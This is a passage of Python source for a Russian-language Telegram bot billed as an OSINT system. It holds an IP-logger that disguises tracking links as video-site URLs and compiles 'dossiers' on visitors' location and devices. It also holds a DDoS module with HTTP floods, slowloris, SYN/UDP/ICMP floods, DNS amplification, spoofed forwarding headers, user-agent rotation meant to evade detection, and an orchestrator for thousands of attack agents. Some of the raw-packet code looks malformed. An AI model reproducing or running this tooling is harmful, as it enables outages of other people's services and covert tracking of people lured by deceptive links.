            {"name": "Dailymotion", "domain": "dailymotion.com", "path": "/video", "icon": "🎥"},
            {"name": "Vimeo", "domain": "vimeo.com", "path": "/", "icon": "📽️"},
            {"name": "Bilibili", "domain": "bilibili.com", "path": "/video/", "icon": "📺"},
            {"name": "Twitch", "domain": "twitch.tv", "path": "/videos/", "icon": "🔴"},
            {"name": "TikTok", "domain": "tiktok.com", "path": "/@", "icon": "🎵"},
            {"name": "Instagram Reels", "domain": "instagram.com", "path": "/reels/", "icon": "📸"},
            {"name": "Facebook Watch", "domain": "facebook.com", "path": "/watch/", "icon": "👀"},
        ]
    
    def _get_geo_by_ip(self, ip: str) -> Dict:
        geo_data = {
            "country": "Unknown", "city": "Unknown", "region": "Unknown",
            "lat": 0, "lon": 0, "isp": "Unknown", "timezone": "Unknown",
            "org": "Unknown", "asn": "Unknown", "postal": "Unknown",
            "accuracy": "Unknown", "mobile": False, "proxy": False, "hosting": False
        }
        
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,regionName,lat,lon,isp,timezone,org,as,zip,mobile,proxy,hosting", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    geo_data.update({
                        "country": data.get('country', 'Unknown'),
                        "city": data.get('city', 'Unknown'),
                        "region": data.get('regionName', 'Unknown'),
                        "lat": data.get('lat', 0),
                        "lon": data.get('lon', 0),
                        "isp": data.get('isp', 'Unknown'),
                        "timezone": data.get('timezone', 'Unknown'),
                        "org": data.get('org', 'Unknown'),
                        "asn": data.get('as', 'Unknown'),
                        "postal": data.get('zip', 'Unknown'),
                        "mobile": data.get('mobile', False),
                        "proxy": data.get('proxy', False),
                        "hosting": data.get('hosting', False),
                    })
        except:
            pass
        
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
            if response.status_code == 200:
                data = response.json()
                geo_data.update({
                    "country": data.get('country', geo_data['country']),
                    "city": data.get('city', geo_data['city']),
                    "region": data.get('region', geo_data['region']),
                    "org": data.get('org', geo_data['org']),
                })
        except:
            pass
        
        return geo_data
    
    def _detect_device(self, ua: str) -> Dict:
        ua = ua.lower()
        device = {
            "type": "Desktop", "os": "Unknown", "browser": "Unknown",
            "version": "Unknown", "mobile": False, "tablet": False
        }
        
        if "mobile" in ua or "android" in ua or "iphone" in ua:
            device["type"] = "Mobile"
            device["mobile"] = True
        elif "tablet" in ua or "ipad" in ua:
            device["type"] = "Tablet"
            device["tablet"] = True
        
        if "windows" in ua:
            device["os"] = "Windows"
        elif "mac" in ua or "apple" in ua:
            device["os"] = "macOS"
        elif "linux" in ua:
            device["os"] = "Linux"
        elif "android" in ua:
            device["os"] = "Android"
        elif "iphone" in ua or "ios" in ua:
            device["os"] = "iOS"
        
        if "chrome" in ua and "edge" not in ua:
            device["browser"] = "Chrome"
        elif "firefox" in ua:
            device["browser"] = "Firefox"
        elif "safari" in ua and "chrome" not in ua:
            device["browser"] = "Safari"
        elif "edge" in ua:
            device["browser"] = "Edge"
        elif "opera" in ua:
            device["browser"] = "Opera"
        
        return device
    
    def create_logger(self, video_url: str, redirect_url: str = None, expire_hours: int = 24) -> Dict:
        logger_id = hashlib.md5(f"{video_url}{time.time()}{random.random()}{os.urandom(16)}".encode()).hexdigest()[:12]
        service = random.choice(self.redirect_services)
        video_id = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 15)))
        masked_url = f"https://{service['domain']}{service['path']}{video_id}"
        short_id = hashlib.md5(logger_id.encode()).hexdigest()[:6]
        short_url = f"https://iplogger.link/{short_id}"
        
        if not redirect_url:
            redirect_url = video_url
        
        log_data = {
            "id": logger_id,
            "video_url": video_url,
            "redirect_url": redirect_url,
            "masked_url": masked_url,
            "short_url": short_url,
            "service": service,
            "created_at": time.time(),
            "expire_at": time.time() + (expire_hours * 3600),
            "hits": [],
            "total_hits": 0,
            "unique_ips": set(),
            "unique_visitors": {},
            "countries": {},
            "cities": {},
            "devices": {},
            "browsers": {},
            "oss": {},
            "last_hit": None
        }
        
        with self.lock:
            self.logs[logger_id] = log_data
        
        return {
            "id": logger_id,
            "masked_url": masked_url,
            "short_url": short_url,
            "redirect_url": redirect_url,
            "service": service['name'],
            "expire": expire_hours
        }
    
    def log_hit(self, logger_id: str, request_data: Dict) -> Dict:
        with self.lock:
            if logger_id not in self.logs:
                return {"error": "Logger not found"}
            
            log = self.logs[logger_id]
            
            if time.time() > log["expire_at"]:
                return {"error": "Logger expired"}
            
            ip = request_data.get("ip", "0.0.0.0")
            ua = request_data.get("user_agent", "Unknown")
            
            geo = self._get_geo_by_ip(ip)
            device = self._detect_device(ua)
            
            timestamp = time.time()
            dt = datetime.datetime.fromtimestamp(timestamp)
            
            hit = {
                "timestamp": timestamp,
                "datetime": dt.strftime("%Y-%m-%d %H:%M:%S"),
                "ip": ip,
                "user_agent": ua,
                "device": device,
                "geo": geo,
                "referer": request_data.get("referer", ""),
                "language": request_data.get("language", ""),
            }
            
            log["hits"].append(hit)
            log["total_hits"] += 1
            log["unique_ips"].add(ip)
            log["last_hit"] = timestamp
            
            country = geo.get("country", "Unknown")
            log["countries"][country] = log["countries"].get(country, 0) + 1
            
            city = geo.get("city", "Unknown")
            log["cities"][city] = log["cities"].get(city, 0) + 1
            
            device_type = device.get("type", "Unknown")
            log["devices"][device_type] = log["devices"].get(device_type, 0) + 1
            
            browser = device.get("browser", "Unknown")
            log["browsers"][browser] = log["browsers"].get(browser, 0) + 1
            
            os_type = device.get("os", "Unknown")
            log["oss"][os_type] = log["oss"].get(os_type, 0) + 1
            
            visitor_key = f"{ip}_{device.get('browser', 'Unknown')}"
            if visitor_key not in log["unique_visitors"]:
                log["unique_visitors"][visitor_key] = {
                    "first_seen": timestamp,
                    "last_seen": timestamp,
                    "count": 1,
                    "ip": ip,
                    "device": device,
                    "geo": geo
                }
            else:
                log["unique_visitors"][visitor_key]["last_seen"] = timestamp
                log["unique_visitors"][visitor_key]["count"] += 1
            
            return hit
    
    def get_stats(self, logger_id: str) -> Dict:
        with self.lock:
            if logger_id not in self.logs:
                return {"error": "Logger not found"}
            
            log = self.logs[logger_id]
            
            return {
                "id": log["id"],
                "total_hits": log["total_hits"],
                "unique_ips": len(log["unique_ips"]),
                "unique_visitors": len(log["unique_visitors"]),
                "countries": log["countries"],
                "cities": log["cities"],
                "devices": log["devices"],
                "browsers": log["browsers"],
                "oss": log["oss"],
                "hits": log["hits"][-20:],
                "created_at": log["created_at"],
                "expire_at": log["expire_at"],
                "redirect_url": log["redirect_url"],
                "masked_url": log["masked_url"],
                "short_url": log["short_url"],
                "last_hit": log["last_hit"]
            }
    
    def get_full_dossier(self, logger_id: str) -> Dict:
        with self.lock:
            if logger_id not in self.logs:
                return {"error": "Logger not found"}
            
            log = self.logs[logger_id]
            
            ips = {}
            devices = {}
            countries = {}
            cities = {}
            browsers = {}
            oss = {}
            time_of_day = {"morning": 0, "afternoon": 0, "evening": 0, "night": 0}
            
            for hit in log["hits"]:
                ip = hit.get("ip", "0.0.0.0")
                ips[ip] = ips.get(ip, 0) + 1
                
                device = hit.get("device", {}).get("type", "Unknown")
                devices[device] = devices.get(device, 0) + 1
                
                geo = hit.get("geo", {})
                country = geo.get("country", "Unknown")
                countries[country] = countries.get(country, 0) + 1
                
                city = geo.get("city", "Unknown")
                cities[city] = cities.get(city, 0) + 1
                
                browser = hit.get("device", {}).get("browser", "Unknown")
                browsers[browser] = browsers.get(browser, 0) + 1
                
                os_type = hit.get("device", {}).get("os", "Unknown")
                oss[os_type] = oss.get(os_type, 0) + 1
                
                dt = datetime.datetime.fromtimestamp(hit.get("timestamp", 0))
                hour = dt.hour
                if 6 <= hour < 12:
                    time_of_day["morning"] += 1
                elif 12 <= hour < 18:
                    time_of_day["afternoon"] += 1
                elif 18 <= hour < 23:
                    time_of_day["evening"] += 1
                else:
                    time_of_day["night"] += 1
            
            return {
                "id": log["id"],
                "video_url": log["video_url"],
                "redirect_url": log["redirect_url"],
                "masked_url": log["masked_url"],
                "short_url": log["short_url"],
                "service": log["service"],
                "total_hits": log["total_hits"],
                "unique_ips": len(log["unique_ips"]),
                "unique_visitors": len(log["unique_visitors"]),
                "ips": ips,
                "devices": devices,
                "countries": countries,
                "cities": cities,
                "browsers": browsers,
                "oss": oss,
                "time_of_day": time_of_day,
                "all_hits": log["hits"],
                "created_at": log["created_at"],
                "expire_at": log["expire_at"],
                "last_hit": log["last_hit"],
                "is_expired": time.time() > log["expire_at"]
            }
    
    def generate_dossier_files(self, logger_id: str) -> Tuple[str, str]:
        dossier = self.get_full_dossier(logger_id)
        if "error" in dossier:
            return None, None
        
        filename = f"dossier_{logger_id}_{int(time.time())}"
        json_path = os.path.join(TEMP_FOLDER, "dossiers", f"{filename}.json")
        txt_path = os.path.join(TEMP_FOLDER, "dossiers", f"{filename}.txt")
        
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(dossier, f, indent=2, ensure_ascii=False)
        
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"   ДОСЬЕ ЛОГГЕРА {logger_id}\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"🆔 ID: {dossier['id']}\n")
            f.write(f"📹 Сервис: {dossier['service']['name']}\n")
            f.write(f"🔗 Маскированная ссылка: {dossier['masked_url']}\n")
            f.write(f"🔗 Короткая ссылка: {dossier['short_url']}\n")
            f.write(f"🔗 Редирект: {dossier['redirect_url']}\n")
            f.write(f"📅 Создан: {time.ctime(dossier['created_at'])}\n")
            f.write(f"⏰ Истекает: {time.ctime(dossier['expire_at'])}\n")
            f.write(f"📊 Всего переходов: {dossier['total_hits']}\n")
            f.write(f"👤 Уникальных IP: {dossier['unique_ips']}\n")
            f.write(f"👥 Уникальных посетителей: {dossier['unique_visitors']}\n")
            f.write(f"🔄 Статус: {'ИСТЕК' if dossier['is_expired'] else 'АКТИВЕН'}\n\n")
            
            f.write("-" * 60 + "\n")
            f.write("  СТАТИСТИКА ПО СТРАНАМ\n")
            f.write("-" * 60 + "\n")
            for country, count in sorted(dossier['countries'].items(), key=lambda x: x[1], reverse=True):
                f.write(f"  {country}: {count} переходов\n")
            
            f.write("\n" + "-" * 60 + "\n")
            f.write("  СТАТИСТИКА ПО ГОРОДАМ\n")
            f.write("-" * 60 + "\n")
            for city, count in sorted(dossier['cities'].items(), key=lambda x: x[1], reverse=True)[:10]:
                f.write(f"  {city}: {count} переходов\n")
            
            f.write("\n" + "-" * 60 + "\n")
            f.write("  СТАТИСТИКА ПО УСТРОЙСТВАМ\n")
            f.write("-" * 60 + "\n")
            for device, count in dossier['devices'].items():
                f.write(f"  {device}: {count} переходов ({count/dossier['total_hits']*100:.1f}%)\n")
            
            f.write("\n" + "-" * 60 + "\n")
            f.write("  СТАТИСТИКА ПО БРАУЗЕРАМ\n")
            f.write("-" * 60 + "\n")
            for browser, count in dossier['browsers'].items():
                f.write(f"  {browser}: {count} переходов\n")
            
            f.write("\n" + "-" * 60 + "\n")
            f.write("  СТАТИСТИКА ПО ОС\n")
            f.write("-" * 60 + "\n")
            for os_type, count in dossier['oss'].items():
                f.write(f"  {os_type}: {count} переходов\n")
            
            f.write("\n" + "-" * 60 + "\n")
            f.write("  ВРЕМЯ ПОСЕЩЕНИЙ\n")
            f.write("-" * 60 + "\n")
            for period, count in dossier['time_of_day'].items():
                f.write(f"  {period.capitalize()}: {count} переходов\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("  ПОСЛЕДНИЕ 20 ПОСЕЩЕНИЙ\n")
            f.write("=" * 60 + "\n\n")
            
            for hit in dossier['all_hits'][-20:]:
                f.write(f"📅 {hit.get('datetime', 'Unknown')}\n")
                f.write(f"   IP: {hit.get('ip', '0.0.0.0')}\n")
                f.write(f"   📍 {hit.get('geo', {}).get('country', 'Unknown')}, {hit.get('geo', {}).get('city', 'Unknown')}\n")
                f.write(f"   📱 {hit.get('device', {}).get('type', 'Unknown')} | {hit.get('device', {}).get('os', 'Unknown')} | {hit.get('device', {}).get('browser', 'Unknown')}\n")
                f.write(f"   🌐 {hit.get('user_agent', 'Unknown')[:100]}...\n\n")
            
            f.write("=" * 60 + "\n")
            f.write("  КОНЕЦ ДОСЬЕ\n")
            f.write("=" * 60 + "\n")
        
        return json_path, txt_path

# ================================================================
# DDOS МОДУЛЬ
# ================================================================
class AntiDetection:
    def __init__(self):
        self.user_agents = self._generate_user_agents()
        self.headers = self._generate_headers()
    
    def _generate_user_agents(self) -> List[str]:
        agents = []
        os_list = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 10.0; WOW64",
            "Windows NT 6.1; Win64; x64",
            "Windows NT 6.3; Win64; x64",
            "Macintosh; Intel Mac OS X 10_15_7",
            "Macintosh; Intel Mac OS X 11_6",
            "Macintosh; Intel Mac OS X 12_4",
            "X11; Linux x86_64",
            "X11; Ubuntu; Linux x86_64",
            "X11; Fedora; Linux x86_64",
        ]
        
        browsers = [
            ("Chrome", 90, 120),
            ("Firefox", 88, 118),
            ("Safari", 60, 70),
            ("Edge", 90, 120),
            ("Opera", 70, 95),
            ("Brave", 10, 30),
        ]
        
        for _ in range(200):
            for os_str in os_list:
                for browser, min_ver, max_ver in browsers:
                    version = random.randint(min_ver, max_ver)
                    build = random.randint(1000, 9999)
                    patch = random.randint(0, 999)
                    webkit = random.randint(530, 538)
                    ua = f"Mozilla/5.0 ({os_str}) AppleWebKit/{webkit}.{random.randint(10,40)} (KHTML, like Gecko) {browser}/{version}.{build}.{patch} Safari/{webkit}.{random.randint(10,40)}"
                    agents.append(ua)
        return agents
    
    def _generate_headers(self) -> Dict[str, str]:
        return {
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "application/json, text/plain, */*",
                "application/xml, text/xml, */*",
            ]),
            "Accept-Language": random.choice([
                "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                "en-US,en;q=0.9,ru;q=0.8",
                "en-GB,en;q=0.9,ru;q=0.8",
            ]),
            "Accept-Encoding": random.choice([
                "gzip, deflate, br",
                "gzip, deflate",
                "gzip, br",
            ]),
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
        }

anti_detect = AntiDetection()

class DDoSAgent:
    def __init__(self, agent_id: int, target: str):
        self.agent_id = agent_id
        self.target = target
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.ip_spoof = self._generate_spoof_ip()
        self.session = None
        self.sockets = []
        self.attack_counter = 0
        self.thread = None
    
    def _generate_spoof_ip(self) -> str:
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def init_session(self):
        self.session = requests.Session()
        self.session.headers.update(anti_detect.headers)
        self.session.headers["User-Agent"] = random.choice(anti_detect.user_agents)
        self.session.headers["X-Forwarded-For"] = self.ip_spoof
        self.session.headers["X-Real-IP"] = self.ip_spoof
        self.session.headers["X-Client-IP"] = self.ip_spoof
        
        for _ in range(20):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.05)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.sockets.append(sock)
    
    def attack(self):
        self.init_session()
        
        attack_functions = [
            self.http_flood,
            self.syn_flood,
            self.udp_flood,
            self.icmp_flood,
            self.slowloris,
            self.dns_amplification,
            self.ping_of_death,
        ]
        
        while self.running:
            for attack in attack_functions:
                try:
                    attack()
                    self.attack_counter += 1
                except:
                    pass
    
    def http_flood(self):
        if not self.session:
            return
        
        parsed = urllib.parse.urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        paths = ["/", "/index", "/admin", "/api", "/login", "/wp-admin", "/.env", "/config"]
        methods = ["GET", "POST", "HEAD", "OPTIONS"]
        
        for _ in range(random.randint(5, 20)):
            method = random.choice(methods)
            path = random.choice(paths)
            
            params = {
                'cache_buster': str(random.randint(0, 2**32-1)),
                '_': str(time.time()),
            }
            
            body = None
            if method in ["POST"]:
                body = json.dumps({f"field_{i}": ''.join(random.choices(string.ascii_letters + string.digits, k=500)) for i in range(20)})
            
            headers = {
                "User-Agent": random.choice(anti_detect.user_agents),
                "X-Forwarded-For": self.ip_spoof,
                "X-Real-IP": self.ip_spoof,
                "X-Client-IP": self.ip_spoof,
                "Referer": f"http://{random.choice(['google.com','bing.com','yahoo.com'])}/search?q={''.join(random.choices(string.ascii_lowercase, k=10))}",
            }
            
            try:
                if method == "GET":
                    resp = self.session.get(f"{base_url}{path}", params=params, headers=headers, timeout=0.3)
                elif method == "POST":
                    resp = self.session.post(f"{base_url}{path}", params=params, data=body, headers=headers, timeout=0.3)
                else:
                    resp = self.session.head(f"{base_url}{path}", params=params, headers=headers, timeout=0.3)
                
                self.packets_sent += 1
                self.bytes_sent += len(resp.content) if resp.content else 0
                resp.close()
            except:
                pass
    
    def syn_flood(self):
        if not self.sockets:
            return
        
        for sock in self.sockets[:5]:
            try:
                dst_port = random.randint(1, 65535)
                seq = random.randint(0, 2**32-1)
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                packet = struct.pack('!BBHHLLBBH',
                    0x45, 0x00, 40, 0, 0x4000, 0x40, 6, 0,
                    socket.inet_aton(src_ip), socket.inet_aton("127.0.0.1"),
                    random.randint(1024, 65535), dst_port, seq, 0, 0x5010, 0x0000
                )
                
                sock.sendto(packet, ("127.0.0.1", dst_port))
                self.packets_sent += 1
            except:
                pass
    
    def udp_flood(self):
        if not self.sockets:
            return
        
        for sock in self.sockets[:5]:
            try:
                dst_port = random.randint(1, 65535)
                data = os.urandom(random.randint(64, 65507))
                sock.sendto(data, ("127.0.0.1", dst_port))
                self.packets_sent += 1
            except:
                pass
    
    def icmp_flood(self):
        if not self.sockets:
            return
        
        for sock in self.sockets[:3]:
            try:
                type_ = 8
                code = 0
                identifier = random.randint(0, 65535)
                sequence = random.randint(0, 65535)
                data = os.urandom(random.randint(8, 1024))
                
                packet = struct.pack('!BBHHH', type_, code, 0, identifier, sequence) + data
                checksum = self._calculate_checksum(packet)
                packet = struct.pack('!BBHHH', type_, code, checksum, identifier, sequence) + data
                
                sock.sendto(packet, ("127.0.0.1", 0))
                self.packets_sent += 1
            except:
                pass
    
    def slowloris(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect(("127.0.0.1", 80))
            
            headers = [
                f"GET /{''.join(random.choices(string.ascii_lowercase, k=10))} HTTP/1.1\r\n",
                f"Host: target.com\r\n",
                f"User-Agent: {random.choice(anti_detect.user_agents)}\r\n",
                f"X-Forwarded-For: {self.ip_spoof}\r\n",
                f"X-Real-IP: {self.ip_spoof}\r\n",
            ]
            
            for header in headers:
                sock.send(header.encode())
                time.sleep(random.uniform(0.05, 0.2))
            
            start = time.time()
            while self.running and time.time() - start < 60:
                sock.send(f"X-Idle: {random.randint(1,999999)}\r\n".encode())
                time.sleep(random.uniform(5, 15))
            
            sock.close()
        except:
            pass
    
    def dns_amplification(self):
        if not self.sockets:
            return
        
        for sock in self.sockets[:3]:
            try:
                domain = f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(5,15)))}.com"
                dns_query = self._build_dns_query(domain)
                sock.sendto(dns_query, ("8.8.8.8", 53))
                self.packets_sent += 1
            except:
                pass
    
    def ping_of_death(self):
        if not self.sockets:
            return
        
        for sock in self.sockets[:3]:
            try:
                data = os.urandom(65507)
                packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(0,65535), random.randint(0,65535)) + data
                checksum = self._calculate_checksum(packet)
                packet = struct.pack('!BBHHH', 8, 0, checksum, random.randint(0,65535), random.randint(0,65535)) + data
                
                sock.sendto(packet, ("127.0.0.1", 0))
                self.packets_sent += 1
            except:
                pass
    
    def _build_dns_query(self, domain: str) -> bytes:
        transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
        flags = 0x0100.to_bytes(2, 'big')
        questions = 0x0001.to_bytes(2, 'big')
        answer_rr = 0x0000.to_bytes(2, 'big')
        authority_rr = 0x0000.to_bytes(2, 'big')
        additional_rr = 0x0000.to_bytes(2, 'big')
        
        name_parts = domain.split('.')
        name_bytes = b''
        for part in name_parts:
            name_bytes += len(part).to_bytes(1, 'big') + part.encode()
        name_bytes += b'\x00'
        
        qtype = 0x0001.to_bytes(2, 'big')
        qclass = 0x0001.to_bytes(2, 'big')
        
        return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + name_bytes + qtype + qclass
    
    def _calculate_checksum(self, data: bytes) -> int:
        if len(data) % 2 != 0:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i+1]
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        return ~checksum & 0xFFFF
    
    def stop(self):
        self.running = False
        if self.session:
            try:
                self.session.close()
            except:
                pass
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets = []

class DDoSOrchestrator:
    def __init__(self, target: str, agents_count: int = 10000):
        self.target = target
        self.agents_count = agents_count
        self.agents = []
        self.running = True
        self.stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'active_agents': 0,
            'start_time': time.time(),
            'agents_created': 0,
            'peak_pps': 0,
        }
        self.lock = threading.Lock()
        self.thread_pool = ThreadPoolExecutor(max_workers=multiprocessing.cpu_count() * 4)
    
    def create_army(self):
        print(f"[*] Creating army of {self.agents_count:,} agents...")
        
        batch_size = 10000
        for i in range(0, self.agents_count, batch_size):
            end = min(i + batch_size, self.agents_count)
            print(f"[*] Creating agents {i:,} - {end:,}...")
            
            for j in range(i, end):
                agent = DDoSAgent(j, self.target)
                self.agents.append(agent)
                self.stats['agents_created'] += 1
            
            print(f"[+] Created {end:,} agents")
        
        print(f"[+] Army created: {len(self.agents):,} agents")
        return self.agents
    
    def start_attack(self):
        print("[*] Starting attack...")
        
        wave_size = 1000
        total_waves = len(self.agents) // wave_size
        
        for wave in range(total_waves):
            start = wave * wave_size
            end = min(start + wave_size, len(self.agents))
            
            for agent in self.agents[start:end]:
                agent.thread = self.thread_pool.submit(agent.attack)
            
            print(f"[*] Wave {wave+1}/{total_waves} launched ({end:,} agents)")
            time.sleep(0.01)
        
        monitor_thread = threading.Thread(target=self._monitor_stats, daemon=True)
        monitor_thread.start()
    
    def _monitor_stats(self):
        while self.running:
            total_packets = sum(a.packets_sent for a in self.agents)
            total_bytes = sum(a.bytes_sent for a in self.agents)
            active = len([a for a in self.agents if a.running])
            elapsed = time.time() - self.stats['start_time']
            pps = total_packets / elapsed if elapsed > 0 else 0
            
            if pps > self.stats['peak_pps']:
                self.stats['peak_pps'] = pps
            
            print(f"\r[⚡] Packets: {total_packets:,} | Bytes: {total_bytes/1024/1024/1024:.2f} GB | Active: {active:,} | PPS: {pps:,.0f} | Peak: {self.stats['peak_pps']:,.0f} | Agents: {len(self.agents):,}", end='')
            
            self.stats['total_packets'] = total_packets
            self.stats['total_bytes'] = total_bytes
            self.stats['active_agents'] = active
            
            time.sleep(1)
    
    def stop_attack(self):
        print("\n[*] Stopping attack...")
        self.running = False
        
        for agent in self.agents:
            agent.stop()
        
        self.thread_pool.shutdown(wait=False)
        
        stats = self.get_stats()
        print(f"[+] Attack stopped! Total packets: {stats['total_packets']:,}")
        return stats
    
    def get_stats(self) -> Dict:
        elapsed = time.time() - self.stats['start_time']
        return {
            'total_packets': self.stats['total_packets'],
            'total_bytes': self.stats['total_bytes'],
            'active_agents': self.stats['active_agents'],
            'total_agents': len(self.agents),
            'elapsed_seconds': elapsed,
            'packets_per_second': self.stats['total_packets'] / elapsed if elapsed > 0 else 0,
            'peak_pps': self.stats['peak_pps'],
            'bytes_per_second': self.stats['total_bytes'] / elapsed if elapsed > 0 else 0,
            'agents_created': self.stats['agents_created'],
            'packets_millions': self.stats['total_packets'] / 1000000,
            'gigabytes': self.stats['total_bytes'] / (1024**3),
        }

# ================================================================
# DDOS ФУНКЦИИ ДЛЯ БОТА
# ================================================================
def start_ddos(target: str, agents: int = 10000) -> DDoSOrchestrator:
    orchestrator = DDoSOrchestrator(target, agents)
    orchestrator.create_army()
    attack_thread = threading.Thread(target=orchestrator.start_attack, daemon=True)
    attack_thread.start()
    return orchestrator

def stop_ddos(orchestrator: DDoSOrchestrator) -> Dict:
    if orchestrator:
        return orchestrator.stop_attack()
    return {"error": "No active attack"}

def get_ddos_stats(orchestrator: DDoSOrchestrator) -> Dict:
    if orchestrator:
        return orchestrator.get_stats()
    return {"error": "No active attack"}

def format_ddos_stats(stats: Dict) -> str:
    if "error" in stats:
        return f"❌ {stats['error']}"
    
    elapsed = stats.get('elapsed_seconds', 0)
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    seconds = int(elapsed % 60)
    
    return (
        f"📊 **Статистика DDoS атаки**\n\n"
        f"📦 **Пакетов:** `{stats['total_packets']:,}`\n"
        f"💾 **Байт:** `{stats['total_bytes'] / (1024**3):.2f} GB`\n"
        f"👾 **Агентов:** `{stats['total_agents']:,}`\n"
        f"⚡ **PPS:** `{stats['packets_per_second']:,.0f}`\n"
        f"🔥 **Пик PPS:** `{stats['peak_pps']:,.0f}`\n"
        f"⏱️ **Время:** `{hours:02d}:{minutes:02d}:{seconds:02d}`"
    )

# ================================================================
# ТЕЛЕГРАМ БОТ
# ================================================================
class ObsidianBot:
    def __init__(self):
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.setup_handlers()
        self.iplogger = IPLoggerUltimate()
        self.ddos_attacks = {}
    
    def setup_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("ddos", self.ddos_command))
        self.app.add_handler(CommandHandler("stopddos", self.stop_ddos))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.app.add_handler(MessageHandler(filters.PHOTO, self.handle_photo))
        self.app.add_handler(MessageHandler(filters.Document, self.handle_document))
    
    async def start(self, update: Update, context):
        keyboard = [
            [InlineKeyboardButton("📧 Поиск по почте", callback_data="email")],
            [InlineKeyboardButton("📱 Поиск по номеру", callback_data="phone")],
            [InlineKeyboardButton("🌐 Поиск по IP", callback_data="ip")],
            [InlineKeyboardButton("🌍 Поиск по домену", callback_data="domain")],
            [InlineKeyboardButton("👤 Поиск в соцсетях", callback_data="social")],
            [InlineKeyboardButton("🖼️ Извлечение метаданных", callback_data="metadata")],
            [InlineKeyboardButton("📍 Геолокация", callback_data="geo")],
            [InlineKeyboardButton("💀 Поиск по базам", callback_data="leaks")],
            [InlineKeyboardButton("🔍 Shodan", callback_data="shodan")],
            [InlineKeyboardButton("📋 WHOIS", callback_data="whois")],
            [InlineKeyboardButton("📡 IPLogger Ultimate", callback_data="iplogger")],
            [InlineKeyboardButton("📄 Досье", callback_data="dossier")],
            [InlineKeyboardButton("💥 DDOS", callback_data="ddos")],
        ]
        await update.message.reply_text(
            "⚫ **OBSIDIAN OSINT SYSTEM v7.0**\n"
            "══════════════════════════\n"
            "📡 IPLogger Ultimate\n"
            "💥 DDOS 1M AGENTS\n"
            "📄 Досье в .txt/.json\n\n"
            "Выбери инструмент:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    async def handle_callback(self, update: Update, context):
        query = update.callback_query
        await query.answer()
        data = query.data
        
        if data == "iplogger":
            await query.edit_message_text(
                "📡 **IPLogger Ultimate**\n\n"
                "Отправь ссылку на видео:\n"
                "Пример: https://www.youtube.com/watch?v=xxxxxxx\n\n"
                "📊 **Что собирается:**\n"
                "├ 🌍 Геолокация\n"
                "├ 📱 Устройство, ОС, браузер\n"
                "├ 👤 Уникальные посетители\n"
                "└ 📊 Полная статистика\n\n"
                "📄 **Результат:** досье в .txt и .json",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'iplogger'
        
        elif data == "dossier":
            await query.edit_message_text(
                "📄 **Получение досье**\n\n"
                "Введи ID логгера:\n"
                "Пример: a1b2c3d4e5f6\n\n"
                "📄 **Файлы:**\n"
                "├ 📄 .txt - для чтения\n"
                "└ 📊 .json - для анализа",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'dossier'
        
        elif data == "ddos":
            await query.edit_message_text(
                "💥 **СУПЕР-DDOS МОДУЛЬ**\n\n"
                "Введи цель (URL):\n"
                "Пример: http://example.com\n\n"
                "⚡ **Мощность:**\n"
                "├ 7 типов атак\n"
                "├ 10000+ агентов\n"
                "├ Обход WAF\n"
                "└ Максимальная скорость\n\n"
                "🛑 Остановка: /stopddos",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'ddos'
        
        else:
            await query.edit_message_text(
                f"🔍 **Выбран инструмент: {data}**\n\n"
                "Введи запрос для поиска.",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = data
    
    async def handle_message(self, update: Update, context):
        text = update.message.text
        mode = context.user_data.get('mode', '')
        
        if mode == 'iplogger':
            logger = self.iplogger.create_logger(text)
            response = (
                f"📡 **IPLogger Ultimate создан!**\n\n"
                f"🆔 **ID:** `{logger['id']}`\n"
                f"🔗 **Маскированная ссылка:**\n`{logger['masked_url']}`\n\n"
                f"🔗 **Короткая ссылка:**\n`{logger['short_url']}`\n\n"
                f"📹 **Сервис:** {logger['service']}\n"
                f"⏰ **Истекает через:** {logger['expire']} часов\n\n"
                f"📊 **Для получения досье:** `/dossier {logger['id']}`"
            )
